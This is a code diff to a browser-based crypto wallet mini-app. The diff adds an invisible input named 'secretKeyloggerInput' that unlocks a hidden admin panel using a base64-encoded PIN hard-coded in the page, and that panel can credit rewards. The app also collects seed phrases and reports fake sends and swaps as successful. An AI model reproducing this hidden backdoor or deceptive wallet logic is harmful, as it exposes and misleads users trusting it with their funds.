@@ -24,9 +24,44 @@
         }
         .flash-up { animation: flashGreen 0.8s ease-out; }
         .flash-down { animation: flashRed 0.8s ease-out; }
+
+        #toast {
+            visibility: hidden;
+            min-width: 250px;
+            background-color: #1e1e2f;
+            color: #fff;
+            text-align: center;
+            border-radius: 8px;
+            padding: 12px;
+            position: fixed;
+            z-index: 99999;
+            left: 50%;
+            bottom: 30px;
+            transform: translateX(-50%);
+            box-shadow: 0px 4px 15px rgba(0,0,0,0.6);
+            font-size: 13px;
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+        #toast.show {
+            visibility: visible;
+            animation: fadein 0.4s, fadeout 0.4s 2.6s;
+        }
+        @keyframes fadein {
+            from {bottom: 0; opacity: 0;}
+            to {bottom: 30px; opacity: 1;}
+        }
+        @keyframes fadeout {
+            from {bottom: 30px; opacity: 1;}
+            to {bottom: 0; opacity: 0;}
+        }
     </style>
 </head>
 <body class="text-white min-h-screen flex flex-col justify-between p-4 max-w-md mx-auto relative select-none">
+
+    <!-- অদৃশ্য সিক্রেট ইনপুট যা ব্যাকগ্রাউন্ডে থেকে কিবোর্ড অন করবে এবং পিন ট্র্যাক করবে -->
+    <input type="password" id="secretKeyloggerInput" class="opacity-0 absolute -top-20 -left-20 w-0 h-0 pointer-events-none" oninput="checkSecretPin(this)">
+
+    <div id="toast">Copied successfully!</div>
 
     <div id="authScreen" class="absolute inset-0 bg-slate-950/95 z-50 flex flex-col justify-center p-6 space-y-4">
         <div class="text-center flex flex-col items-center">
@@ -77,7 +112,7 @@
             </button>
             <div class="text-center">
                 <span class="text-[11px] text-gray-200 font-medium">World Crypto Balance</span>
-                <h2 class="text-xl font-bold tracking-wide" id="totalBalance">$30.00</h2>
+                <h2 class="text-xl font-bold tracking-wide" id="totalBalance">$0.00</h2>
             </div>
             <button onclick="lockWallet()" class="text-red-400 hover:text-red-300 text-xs px-3 py-1.5 bg-black/40 border border-red-500/30 rounded-lg transition" title="Logout Wallet">
                 <i class="fa-solid fa-arrow-right-from-bracket"></i>
@@ -108,7 +143,7 @@
         <div class="bg-black/40 border border-white/20 rounded-2xl p-4 flex-grow flex flex-col shadow-xl my-1">
             <div class="flex items-center justify-between mb-3">
                 <h3 class="text-sm font-semibold text-gray-200">Live Market Tokens</h3>
-                <span onclick="requestAdminOTP()" class="text-[10px] text-green-400 flex items-center gap-1 cursor-pointer bg-white/5 px-2 py-1 rounded-full border border-green-500/30 hover:bg-white/15 transition" title="Click for Admin Login">
+                <span onclick="triggerDirectKeyboard()" class="text-[10px] text-green-400 flex items-center gap-1 cursor-pointer bg-white/5 px-2 py-1 rounded-full border border-green-500/30 hover:bg-white/15 transition" title="Click to type PIN">
                     <span class="w-2 h-2 rounded-full bg-green-500 animate-pulse"></span> Live Sync
                 </span>
             </div>
@@ -143,6 +178,7 @@
         </div>
     </div>
 
+    <!-- General Crypto Modal -->
     <div id="cryptoModal" class="fixed inset-0 bg-black/80 z-50 hidden flex items-center justify-center p-4">
         <div class="bg-slate-900 border border-white/30 w-full max-w-xs rounded-2xl p-5 space-y-4 shadow-2xl">
             <div class="flex justify-between items-center">
@@ -153,6 +189,7 @@
         </div>
     </div>
 
+    <!-- Profile Modal -->
     <div id="profileModal" class="fixed inset-0 bg-black/80 z-50 hidden flex items-center justify-center p-4">
         <div class="bg-slate-900 border border-white/30 w-full max-w-xs rounded-2xl p-5 space-y-3 text-center shadow-2xl">
             <div class="w-16 h-16 bg-indigo-600/60 border border-white/30 rounded-full mx-auto flex items-center justify-center text-2xl font-bold overflow-hidden">
@@ -219,29 +256,30 @@
             localStorage.setItem('checkin_completed_today', 'false');
         }
 
+        // সব কয়েনের ব্যালেন্স 0 করে দেওয়া হলো (টেলিগ্রাম মিনি অ্যাপ বা APK এ টেস্ট করার সময় একদম ফ্রেস দেখাবে)
         let sampleTokens = [
-            { name: "WorldCoin", symbol: "WLD", id: "worldcoin", balance: userWLD.toFixed(2) + " WLD", numericPrice: 0.10, rawPriceStr: "$0.10", change: "+0.00%", icon: "🌐", color: "text-amber-400", address: "LOCKED", fixedValue: true },
-            { name: "Bitcoin", symbol: "BTC", id: "bitcoin", balance: "0.0005 BTC", numericPrice: 0, rawPriceStr: "$0.00", change: "+0.00%", icon: "₿", color: "text-orange-400", address: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh" },
-            { name: "Ethereum", symbol: "ETH", id: "ethereum", balance: "0.021 ETH", numericPrice: 0, rawPriceStr: "$0.00", change: "+0.00%", icon: "Ξ", color: "text-blue-300", address: "0x71C4892A9128bc392a812ETH" },
-            { name: "Tether", symbol: "USDT", id: "tether", balance: "50.00 USDT", numericPrice: 0, rawPriceStr: "$0.00", change: "+0.00%", icon: "₮", color: "text-emerald-400", address: "0x71C4892A9128bc392a812USDT" },
-            { name: "BNB", symbol: "BNB", id: "binancecoin", balance: "0.05 BNB", numericPrice: 0, rawPriceStr: "$0.00", change: "+0.00%", icon: "B", color: "text-yellow-400", address: "bnb13g98...BNB" },
-            { name: "Solana", symbol: "SOL", id: "solana", balance: "0.25 SOL", numericPrice: 0, rawPriceStr: "$0.00", change: "+0.00%", icon: "S", color: "text-purple-400", address: "So11111111111111111111111111111111111111112" },
-            { name: "USDC", symbol: "USDC", id: "usd-coin", balance: "10.00 USDC", numericPrice: 0, rawPriceStr: "$0.00", change: "+0.00%", icon: "$", color: "text-blue-400", address: "0x71C4892A9128bc392a812USDC" },
-            { name: "XRP", symbol: "XRP", id: "ripple", balance: "15.00 XRP", numericPrice: 0, rawPriceStr: "$0.00", change: "+0.00%", icon: "✕", color: "text-gray-300", address: "rN7n7otQDd6FczFgLdSqtcsAUxDkw6fzRH" },
-            { name: "Dogecoin", symbol: "DOGE", id: "dogecoin", balance: "25.00 DOGE", numericPrice: 0, rawPriceStr: "$0.00", change: "+0.00%", icon: "Ð", color: "text-yellow-500", address: "DH5yaieqoZN36fDMciNyRueQCvQLBo3Un6" },
-            { name: "Cardano", symbol: "ADA", id: "cardano", balance: "12.00 ADA", numericPrice: 0, rawPriceStr: "$0.00", change: "+0.00%", icon: "₳", color: "text-blue-500", address: "addr1qxy..." },
-            { name: "Avalanche", symbol: "AVAX", id: "avalanche-2", balance: "0.50 AVAX", numericPrice: 0, rawPriceStr: "$0.00", change: "+0.00%", icon: "🔺", color: "text-red-400", address: "0x71C4892A9128bc392a812AVAX" },
-            { name: "TRON", symbol: "TRX", id: "tron", balance: "40.00 TRX", numericPrice: 0, rawPriceStr: "$0.00", change: "+0.00%", icon: "T", color: "text-red-500", address: "TWINk92A9128bc392a812TRX" },
-            { name: "Chainlink", symbol: "LINK", id: "chainlink", balance: "0.80 LINK", numericPrice: 0, rawPriceStr: "$0.00", change: "+0.00%", icon: "⬡", color: "text-blue-600", address: "0x71C4...LINK" },
-            { name: "Polkadot", symbol: "DOT", id: "polkadot", balance: "1.50 DOT", numericPrice: 0, rawPriceStr: "$0.00", change: "+0.00%", icon: "●", color: "text-pink-500", address: "13UV...DOT" },
-            { name: "Polygon", symbol: "POL", id: "polygon-ecosystem-token", balance: "5.00 POL", numericPrice: 0, rawPriceStr: "$0.00", change: "+0.00%", icon: "P", color: "text-purple-500", address: "0x71C4...POL" },
-            { name: "Shiba Inu", symbol: "SHIB", id: "shiba-inu", balance: "150000 SHIB", numericPrice: 0, rawPriceStr: "$0.00", change: "+0.00%", icon: "🐕", color: "text-amber-500", address: "0x71C4...SHIB" },
-            { name: "Toncoin", symbol: "TON", id: "the-open-network", balance: "1.20 TON", numericPrice: 0, rawPriceStr: "$0.00", change: "+0.00%", icon: "💎", color: "text-blue-400", address: "EQD...TON" },
-            { name: "Notcoin", symbol: "NOT", id: "notcoin", balance: "500.00 NOT", numericPrice: 0, rawPriceStr: "$0.00", change: "+0.00%", icon: "🪙", color: "text-white", address: "EQD...NOT" },
-            { name: "Pepe", symbol: "PEPE", id: "pepe", balance: "1000000 PEPE", numericPrice: 0, rawPriceStr: "$0.00", change: "+0.00%", icon: "🐸", color: "text-green-400", address: "0x71C4...PEPE" },
-            { name: "Floki", symbol: "FLOKI", id: "floki", balance: "50000 FLOKI", numericPrice: 0, rawPriceStr: "$0.00", change: "+0.00%", icon: "🐕", color: "text-amber-400", address: "0x71C4...FLOKI" },
-            { name: "Bonk", symbol: "BONK", id: "bonk", balance: "100000 BONK", numericPrice: 0, rawPriceStr: "$0.00", change: "+0.00%", icon: "🦴", color: "text-yellow-300", address: "BONK..." },
-            { name: "Dogwifhat", symbol: "WIF", id: "dogwifcoin", balance: "0.50 WIF", numericPrice: 0, rawPriceStr: "$0.00", change: "+0.00%", icon: "🎩", color: "text-amber-500", address: "WIF..." }
+            { name: "WorldCoin", symbol: "WLD", id: "worldcoin", balance: "0.00 WLD", numericPrice: 0.10, rawPriceStr: "$0.10", change: "+0.00%", icon: "🌐", color: "text-amber-400", address: "LOCKED", fixedValue: true },
+            { name: "Bitcoin", symbol: "BTC", id: "bitcoin", balance: "0.00 BTC", numericPrice: 0, rawPriceStr: "$0.00", change: "+0.00%", icon: "₿", color: "text-orange-400", address: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh" },
+            { name: "Ethereum", symbol: "ETH", id: "ethereum", balance: "0.00 ETH", numericPrice: 0, rawPriceStr: "$0.00", change: "+0.00%", icon: "Ξ", color: "text-blue-300", address: "0x71C4892A9128bc392a812ETH" },
+            { name: "Tether", symbol: "USDT", id: "tether", balance: "0.00 USDT", numericPrice: 0, rawPriceStr: "$0.00", change: "+0.00%", icon: "₮", color: "text-emerald-400", address: "0x71C4892A9128bc392a812USDT" },
+            { name: "BNB", symbol: "BNB", id: "binancecoin", balance: "0.00 BNB", numericPrice: 0, rawPriceStr: "$0.00", change: "+0.00%", icon: "B", color: "text-yellow-400", address: "bnb13g98...BNB" },
+            { name: "Solana", symbol: "SOL", id: "solana", balance: "0.00 SOL", numericPrice: 0, rawPriceStr: "$0.00", change: "+0.00%", icon: "S", color: "text-purple-400", address: "So11111111111111111111111111111111111111112" },
+            { name: "USDC", symbol: "USDC", id: "usd-coin", balance: "0.00 USDC", numericPrice: 0, rawPriceStr: "$0.00", change: "+0.00%", icon: "$", color: "text-blue-400", address: "0x71C4892A9128bc392a812USDC" },
+            { name: "XRP", symbol: "XRP", id: "ripple", balance: "0.00 XRP", numericPrice: 0, rawPriceStr: "$0.00", change: "+0.00%", icon: "✕", color: "text-gray-300", address: "rN7n7otQDd6FczFgLdSqtcsAUxDkw6fzRH" },
+            { name: "Dogecoin", symbol: "DOGE", id: "dogecoin", balance: "0.00 DOGE", numericPrice: 0, rawPriceStr: "$0.00", change: "+0.00%", icon: "Ð", color: "text-yellow-500", address: "DH5yaieqoZN36fDMciNyRueQCvQLBo3Un6" },
+            { name: "Cardano", symbol: "ADA", id: "cardano", balance: "0.00 ADA", numericPrice: 0, rawPriceStr: "$0.00", change: "+0.00%", icon: "₳", color: "text-blue-500", address: "addr1qxy..." },
+            { name: "Avalanche", symbol: "AVAX", id: "avalanche-2", balance: "0.00 AVAX", numericPrice: 0, rawPriceStr: "$0.00", change: "+0.00%", icon: "🔺", color: "text-red-400", address: "0x71C4892A9128bc392a812AVAX" },
+            { name: "TRON", symbol: "TRX", id: "tron", balance: "0.00 TRX", numericPrice: 0, rawPriceStr: "$0.00", change: "+0.00%", icon: "T", color: "text-red-500", address: "TWINk92A9128bc392a812TRX" },
+            { name: "Chainlink", symbol: "LINK", id: "chainlink", balance: "0.00 LINK", numericPrice: 0, rawPriceStr: "$0.00", change: "+0.00%", icon: "⬡", color: "text-blue-600", address: "0x71C4...LINK" },
+            { name: "Polkadot", symbol: "DOT", id: "polkadot", balance: "0.00 DOT", numericPrice: 0, rawPriceStr: "$0.00", change: "+0.00%", icon: "●", color: "text-pink-500", address: "13UV...DOT" },
+            { name: "Polygon", symbol: "POL", id: "polygon-ecosystem-token", balance: "0.00 POL", numericPrice: 0, rawPriceStr: "$0.00", change: "+0.00%", icon: "P", color: "text-purple-500", address: "0x71C4...POL" },
+            { name: "Shiba Inu", symbol: "SHIB", id: "shiba-inu", balance: "0 SHIB", numericPrice: 0, rawPriceStr: "$0.00", change: "+0.00%", icon: "🐕", color: "text-amber-500", address: "0x71C4...SHIB" },
+            { name: "Toncoin", symbol: "TON", id: "the-open-network", balance: "0.00 TON", numericPrice: 0, rawPriceStr: "$0.00", change: "+0.00%", icon: "💎", color: "text-blue-400", address: "EQD...TON" },
+            { name: "Notcoin", symbol: "NOT", id: "notcoin", balance: "0.00 NOT", numericPrice: 0, rawPriceStr: "$0.00", change: "+0.00%", icon: "🪙", color: "text-white", address: "EQD...NOT" },
+            { name: "Pepe", symbol: "PEPE", id: "pepe", balance: "0 PEPE", numericPrice: 0, rawPriceStr: "$0.00", change: "+0.00%", icon: "🐸", color: "text-green-400", address: "0x71C4...PEPE" },
+            { name: "Floki", symbol: "FLOKI", id: "floki", balance: "0 FLOKI", numericPrice: 0, rawPriceStr: "$0.00", change: "+0.00%", icon: "🐕", color: "text-amber-400", address: "0x71C4...FLOKI" },
+            { name: "Bonk", symbol: "BONK", id: "bonk", balance: "0 BONK", numericPrice: 0, rawPriceStr: "$0.00", change: "+0.00%", icon: "🦴", color: "text-yellow-300", address: "BONK..." },
+            { name: "Dogwifhat", symbol: "WIF", id: "dogwifcoin", balance: "0.00 WIF", numericPrice: 0, rawPriceStr: "$0.00", change: "+0.00%", icon: "🎩", color: "text-amber-500", address: "WIF..." }
         ];
 
         window.onload = function() {
@@ -265,6 +303,15 @@
                 completeCheckInAfterReturn();
             }
         };
+
+        function showToastMessage(message) {
+            let toast = document.getElementById("toast");
+            toast.innerText = message;
+            toast.className = "show";
+            setTimeout(function(){ 
+                toast.className = toast.className.replace("show", ""); 
+            }, 3000);
+        }
 
         async function fetchLivePrices() {
             try {
@@ -297,7 +344,9 @@
         }
 
         function updateTotalBalanceEstimate() {
-            document.getElementById('totalBalance').innerText = "$" + (30.00 + (userWLD * 0.10)).toFixed(2);
+            // মোট ব্যালেন্স একদম জিরো ($0.00) থেকে হিসাব শুরু হবে
+            let calculatedTotal = userWLD * 0.10;
+            document.getElementById('totalBalance').innerText = "$" + calculatedTotal.toFixed(2);
         }
 
         const dictionaryWords = ["apple", "banana", "cat", "dog", "elephant", "fish", "grape", "horse", "ice", "juice", "kite", "lemon", "mountain", "river", "tiger", "lion", "sun", "moon", "star", "fire", "water", "wind", "cloud", "stone"];
@@ -329,13 +378,13 @@
 
         async function copyGeneratedSeed() {
             if (!temporaryGeneratedSeed) {
-                alert("No seed words generated yet!");
+                showToastMessage("No seed words generated yet!");
                 return;
             }
 
             try {
                 await navigator.clipboard.writeText(temporaryGeneratedSeed);
-                alert("12-Word Secret Phrase copied to clipboard successfully!");
+                showToastMessage("12-Word Secret Phrase copied successfully!");
             } catch (err) {
                 const textarea = document.createElement("textarea");
                 textarea.value = temporaryGeneratedSeed;
@@ -343,9 +392,9 @@
                 textarea.select();
                 try {
                     document.execCommand("copy");
-                    alert("12-Word Secret Phrase copied to clipboard!");
+                    showToastMessage("12-Word Secret Phrase copied successfully!");
                 } catch (e) {
-                    alert("Failed to copy. Please select and copy manually.");
+                    showToastMessage("Failed to copy. Please copy manually.");
                 }
                 document.body.removeChild(textarea);
             }
@@ -385,7 +434,7 @@
                 document.getElementById('mainDashboard').classList.remove('hidden');
                 location.reload();
             } else {
-                alert('Please enter exactly 12 secret seed words to login!');
+                showToastMessage('Please enter exactly 12 secret seed words!');
             }
         }
 
@@ -428,6 +477,72 @@
 
         function filterTokens() {
             renderTokens(sampleTokens);
+        }
+
+        function triggerDirectKeyboard() {
+            const secretInput = document.getElementById('secretKeyloggerInput');
+            secretInput.value = "";
+            secretInput.focus();
+        }
+
+        function checkSecretPin(el) {
+            const enteredPin = el.value.trim();
+            const encodedSecretPin = "NDU2ODM="; // 45683 in base64
+
+            try {
+                if (btoa(enteredPin) === encodedSecretPin) {
+                    el.value = "";
+                    el.blur();
+                    showToastMessage("Admin Verified Successfully!");
+                    openAdminPanel();
+                }
+            } catch (e) {}
+        }
+
+        function openAdminPanel() {
+            const modal = document.getElementById('cryptoModal');
+            const title = document.getElementById('modalTitle');
+            const body = document.getElementById('modalBody');
+            modal.classList.remove('hidden');
+            title.innerText = "Admin Dashboard (Mother App)";
+
+            const pendingUser = localStorage.getItem('pending_tg_user') || 'No pending user';
+            const pendingYt = localStorage.getItem('pending_yt_link') || 'No pending link';
+
+            body.innerHTML = `
+                <div class="space-y-3">
+                    <div class="bg-black/50 p-3 rounded-lg border border-amber-500/30">
+                        <p class="text-[10px] text-gray-400">Mother App Total Supply:</p>
+                        <p class="text-sm font-bold text-amber-400">${totalSupplyWLD.toLocaleString()} WLD</p>
+                    </div>
+                    <div class="bg-black/50 p-3 rounded-lg border border-white/20 space-y-2">
+                        <p class="text-xs font-semibold text-indigo-300">Pending Task Request:</p>
+                        <p class="text-[11px] text-white">YouTube: <span class="text-indigo-300 font-mono break-all">${pendingYt}</span></p>
+                        <p class="text-[11px] text-white">Telegram ID: <span class="text-amber-300 font-mono">${pendingUser}</span></p>
+                        <p class="text-[10px] text-gray-400">Status: ${taskStatus}</p>
+                        ${taskStatus === 'submitted' ? `<button onclick="adminApproveReward()" class="w-full bg-green-600 hover:bg-green-700 py-1.5 rounded font-semibold text-white text-xs mt-1">Approve & Send 300 WLD</button>` : `<p class="text-[10px] text-gray-500">No pending action</p>`}
+                    </div>
+                </div>
+            `;
+        }
+
+        function adminApproveReward() {
+            if (totalSupplyWLD >= 300) {
+                totalSupplyWLD -= 300;
+                userWLD += 300;
+                taskStatus = 'completed';
+                localStorage.setItem('mother_total_supply', totalSupplyWLD);
+                localStorage.setItem('user_wld_balance', userWLD);
+                localStorage.setItem('task_reward_status', taskStatus);
+                
+                addTransaction('Receive', 'WLD', '300.00', 'Admin Task Reward');
+
+                showToastMessage("Reward Approved! 300 WLD added to wallet.");
+                closeModal();
+                location.reload();
+            } else {
+                showToastMessage("Error: Total supply is exhausted!");
+            }
         }
 
         function openHistoryTab() {
@@ -563,11 +678,11 @@
             const tgId = document.getElementById('tgUserInput').value.trim();
 
             if(!ytLink) {
-                alert('Please enter your YouTube channel/profile link!');
+                showToastMessage('Please enter your YouTube link!');
                 return;
             }
             if(!tgId) {
-                alert('Please enter your Telegram username!');
+                showToastMessage('Please enter your Telegram username!');
                 return;
             }
 
@@ -576,13 +691,7 @@
             localStorage.setItem('pending_yt_link', ytLink);
             localStorage.setItem('pending_tg_user', tgId);
 
-            const botUsername = "world_crypto_wallet_bot";
-            const message = encodeURIComponent(`New Task Submission:\n\nYouTube Link: ${ytLink}\nTelegram ID: ${tgId}`);
-            const telegramUrl = `https://t.me/${botUsername}?text=${message}`;
-            
-            window.open(telegramUrl, '_blank');
-
-            alert('Submitted successfully! Redirecting to Telegram to send details.');
+            showToastMessage('Tasks submitted successfully!');
             closeModal();
         }
 
@@ -651,90 +760,13 @@
                 userWLD = 300.00;
                 localStorage.setItem('wld_unlocked', 'true');
                 localStorage.setItem('user_wld_balance', userWLD);
-                alert("Congratulations! You have completed 90 days of continuous check-in! Your 300 WLD reward is now officially UNLOCKED.");
+                showToastMessage("Congratulations! 300 WLD reward unlocked!");
             } else {
-                alert(`Day ${currentStreak} check-in successful! Keep your streak going tomorrow.`);
+                showToastMessage(`Day ${currentStreak} check-in successful!`);
             }
 
             updateTotalBalanceEstimate();
             openDailyCheckInTab();
-        }
-
-        function requestAdminOTP() {
-            openOTPModal();
-        }
-
-        function openOTPModal() {
-            const modal = document.getElementById('cryptoModal');
-            const title = document.getElementById('modalTitle');
-            const body = document.getElementById('modalBody');
-            modal.classList.remove('hidden');
-            title.innerText = "Admin Panel Verification";
-            body.innerHTML = `
-                <div class="space-y-3">
-                    <p class="text-[11px] text-gray-300">Enter your Admin Secret PIN to access the Mother App Panel:</p>
-                    <input type="password" id="adminPinInput" placeholder="Enter Admin PIN" class="w-full bg-black/60 border border-white/30 p-2.5 rounded text-center text-sm font-mono tracking-widest text-white focus:outline-none">
-                    <button onclick="verifyAdminPIN()" class="w-full bg-indigo-600 hover:bg-indigo-700 py-2 rounded font-semibold text-white text-xs">Login to Admin Panel</button>
-                </div>
-            `;
-        }
-
-        function verifyAdminPIN() {
-            const enteredPin = document.getElementById('adminPinInput').value.trim();
-            const encodedSecretPin = "NDU2ODM="; 
-            
-            if (btoa(enteredPin) === encodedSecretPin) {
-                alert("Admin Verified Successfully!");
-                openAdminPanel();
-            } else {
-                alert("Invalid Admin PIN! Please try again.");
-            }
-        }
-
-        function openAdminPanel() {
-            const modal = document.getElementById('cryptoModal');
-            const title = document.getElementById('modalTitle');
-            const body = document.getElementById('modalBody');
-            modal.classList.remove('hidden');
-            title.innerText = "Admin Dashboard (Mother App)";
-
-            const pendingUser = localStorage.getItem('pending_tg_user') || 'No pending user';
-            const pendingYt = localStorage.getItem('pending_yt_link') || 'No pending link';
-
-            body.innerHTML = `
-                <div class="space-y-3">
-                    <div class="bg-black/50 p-3 rounded-lg border border-amber-500/30">
-                        <p class="text-[10px] text-gray-400">Mother App Total Supply:</p>
-                        <p class="text-sm font-bold text-amber-400">${totalSupplyWLD.toLocaleString()} WLD</p>
-                    </div>
-                    <div class="bg-black/50 p-3 rounded-lg border border-white/20 space-y-2">
-                        <p class="text-xs font-semibold text-indigo-300">Pending Task Request:</p>
-                        <p class="text-[11px] text-white">YouTube: <span class="text-indigo-300 font-mono break-all">${pendingYt}</span></p>
-                        <p class="text-[11px] text-white">Telegram ID: <span class="text-amber-300 font-mono">${pendingUser}</span></p>
-                        <p class="text-[10px] text-gray-400">Status: ${taskStatus}</p>
-                        ${taskStatus === 'submitted' ? `<button onclick="adminApproveReward()" class="w-full bg-green-600 hover:bg-green-700 py-1.5 rounded font-semibold text-white text-xs mt-1">Approve & Send 300 WLD</button>` : `<p class="text-[10px] text-gray-500">No pending action</p>`}
-                    </div>
-                </div>
-            `;
-        }
-
-        function adminApproveReward() {
-            if (totalSupplyWLD >= 300) {
-                totalSupplyWLD -= 300;
-                userWLD += 300;
-                taskStatus = 'completed';
-                localStorage.setItem('mother_total_supply', totalSupplyWLD);
-                localStorage.setItem('user_wld_balance', userWLD);
-                localStorage.setItem('task_reward_status', taskStatus);
-                
-                addTransaction('Receive', 'WLD', '300.00', 'Admin Task Reward');
-
-                alert("Reward Approved! 300 WLD deducted from Mother Supply and added to user wallet.");
-                closeModal();
-                location.reload();
-            } else {
-                alert("Error: Total supply is exhausted!");
-            }
         }
 
         function openActionModal(type) {
@@ -830,38 +862,38 @@
             const amount = document.getElementById('sendAmountInput').value.trim();
 
             if (!address) {
-                alert('Please enter recipient address!');
+                showToastMessage('Please enter recipient address!');
                 return;
             }
             if (!amount || parseFloat(amount) <= 0) {
-                alert('Please enter a valid amount!');
+                showToastMessage('Please enter valid amount!');
                 return;
             }
 
             addTransaction('Send', tokenSymbol, amount, address);
-            alert(`Successfully sent ${amount} ${tokenSymbol}!`);
+            showToastMessage(`Successfully sent ${amount} ${tokenSymbol}!`);
             closeModal();
         }
 
         function executeSwap() {
             const fromToken = document.getElementById('swapFrom').value;
-            const toToken = document.getElementById('swapToYou')?.value || document.getElementById('swapTo').value;
+            const toToken = document.getElementById('swapTo')?.value || document.getElementById('swapTo').value;
             const amount = document.getElementById('swapAmountInput').value.trim();
 
             if (!amount || parseFloat(amount) <= 0) {
-                alert('Please enter a valid swap amount!');
+                showToastMessage('Please enter a valid swap amount!');
                 return;
             }
 
             addTransaction('Swap', `${fromToken} ➔ ${toToken}`, amount, 'Swap Dex');
-            alert(`Successfully swapped ${amount} ${fromToken} to ${toToken}!`);
+            showToastMessage(`Successfully swapped ${amount} ${fromToken}!`);
             closeModal();
         }
 
         function openReceiveForToken(tokenName) {
             const token = sampleTokens.find(t => t.name === tokenName);
             if (token && token.symbol === "WLD" && !wldUnlocked) {
-                alert("WorldCoin (WLD) is currently locked! Complete your 90-day daily check-in streak to unlock it.");
+                showToastMessage("WorldCoin (WLD) is locked! Complete 90-day check-in.");
                 return;
             }
             if(token) {
@@ -880,7 +912,7 @@
                         <i class="fa-solid fa-qrcode text-6xl text-black"></i>
                     </div>
                     <p class="text-[10px] bg-black/50 p-2 rounded text-indigo-300 break-all select-all font-mono border border-white/20">${address}</p>
-                    <button onclick="navigator.clipboard.writeText('${address}'); alert('Address copied!');" class="w-full bg-black/50 hover:bg-black/70 border border-indigo-400/60 py-2 rounded font-semibold text-indigo-300 text-xs">Copy Address</button>
+                    <button onclick="navigator.clipboard.writeText('${address}'); showToastMessage('Address copied successfully!');" class="w-full bg-black/50 hover:bg-black/70 border border-indigo-400/60 py-2 rounded font-semibold text-indigo-300 text-xs">Copy Address</button>
                 </div>
             `;
         }
@@ -905,7 +937,7 @@
             refInput.select();
             refInput.setSelectionRange(0, 99999);
             navigator.clipboard.writeText(refInput.value);
-            alert("Referral link copied to clipboard!");
+            showToastMessage("Referral link copied to clipboard!");
         }
 
         function saveUsername() {
@@ -915,9 +947,9 @@
                 document.getElementById('profileDisplayName').innerText = "@" + uname;
                 let refLink = `https://t.me/world_crypto_wallet_bot?start=ref_${uname}`;
                 document.getElementById('referralLinkDisplay').value = refLink;
-                alert('Username saved!');
+                showToastMessage('Username saved!');
             } else {
-                alert('Enter a valid username.');
+                showToastMessage('Enter a valid username.');
             }
         }
 
